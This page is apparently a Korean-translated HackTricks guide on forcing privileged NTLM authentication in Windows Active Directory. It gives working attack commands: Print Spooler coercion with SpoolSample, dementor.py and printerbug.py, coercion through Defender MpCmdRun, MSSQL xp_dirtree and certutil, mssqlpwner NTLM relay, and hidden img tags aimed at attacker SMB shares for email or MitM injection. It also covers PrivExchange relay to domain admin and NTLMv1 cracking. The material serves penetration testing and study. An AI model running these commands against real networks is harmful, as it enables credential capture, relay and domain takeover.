# Force NTLM Privileged Authentication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 **3rd party dependencies**를 피하기 위해 MIDL 컴파일러를 사용하여 C#로 코딩된 **원격 인증 트리거**의 **모음**입니다.

## Spooler Service Abuse

_**Print Spooler**_ 서비스가 **활성화**되어 있으면, 이미 알려진 AD 자격 증명을 사용하여 도메인 컨트롤러의 프린트 서버에 새로운 인쇄 작업에 대한 **업데이트**를 **요청**하고 이를 **어떤 시스템으로 알리도록** 지시할 수 있습니다.\
프린터가 임의의 시스템으로 알림을 보낼 때, 해당 **시스템**에 대해 **인증**해야 합니다. 따라서 공격자는 _**Print Spooler**_ 서비스가 임의의 시스템에 대해 인증하도록 만들 수 있으며, 이 인증에서 서비스는 **컴퓨터 계정**을 **사용**합니다.

### Finding Windows Servers on the domain

PowerShell을 사용하여 Windows 박스 목록을 가져옵니다. 서버는 일반적으로 우선 순위가 높으므로, 여기에 집중합시다:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler 서비스 청취 확인

약간 수정된 @mysmartlogin의 (Vincent Le Toux의) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 사용하여 Spooler 서비스가 청취 중인지 확인합니다:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux에서 rpcdump.py를 사용하여 MS-RPRN 프로토콜을 찾을 수도 있습니다.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 서비스에 임의의 호스트에 대해 인증하도록 요청

[ **여기에서 SpoolSample을 컴파일할 수 있습니다**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
또는 Linux를 사용하는 경우 [**3xocyte의 dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용하세요.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation과 결합

공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)으로 컴퓨터를 손상시킨 경우, 공격자는 **프린터가 이 컴퓨터에 대해 인증하도록 만들 수 있습니다**. 비제한 위임 덕분에 **프린터의 컴퓨터 계정의 TGT**는 비제한 위임이 있는 컴퓨터의 **메모리에 저장됩니다**. 공격자가 이미 이 호스트를 손상시켰기 때문에, 그는 **이 티켓을 검색하고 악용할 수 있습니다** ([Pass the Ticket](pass-the-ticket.md)).

## RCP 강제 인증

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` 공격은 **Exchange Server `PushSubscription` 기능**에서 발견된 결함의 결과입니다. 이 기능은 Exchange 서버가 메일박스가 있는 모든 도메인 사용자에 의해 HTTP를 통해 제공된 클라이언트 호스트에 인증되도록 강제할 수 있게 합니다.

기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다 (특히, **2019년 누적 업데이트 이전 도메인에 대한 WriteDacl 권한이 있습니다**). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출할 수 있도록 악용될 수 있습니다**. LDAP로의 중계가 불가능한 경우에도 이 결함은 여전히 도메인 내 다른 호스트에 중계하고 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.

## Windows 내부

Windows 머신 내부에 이미 있는 경우, 다음을 사용하여 권한 있는 계정으로 서버에 연결하도록 Windows를 강제할 수 있습니다:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
또는 이 다른 기술을 사용할 수 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft 서명 이진 파일)을 사용하여 NTLM 인증을 강제할 수 있습니다:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML 주입

### 이메일을 통한

당신이 손상시키고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지**가 포함된 **이메일**을 보낼 수 있습니다.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
그리고 그가 그것을 열면, 그는 인증을 시도할 것입니다.

### MitM

컴퓨터에 MitM 공격을 수행하고 그가 볼 수 있는 페이지에 HTML을 주입할 수 있다면, 다음과 같은 이미지를 페이지에 주입해 볼 수 있습니다:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 크래킹

[NTLMv1 챌린지를 캡처할 수 있다면 여기를 읽고 크래킹하는 방법을 알아보세요](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
